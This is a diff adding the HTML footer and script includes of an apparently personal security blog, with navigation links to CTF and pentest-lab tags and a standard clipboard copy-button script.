+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">VHub</a></li>
+         
+          <li><a href="/tags/WEB-%E5%AE%89%E5%85%A8">WEB-安全</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
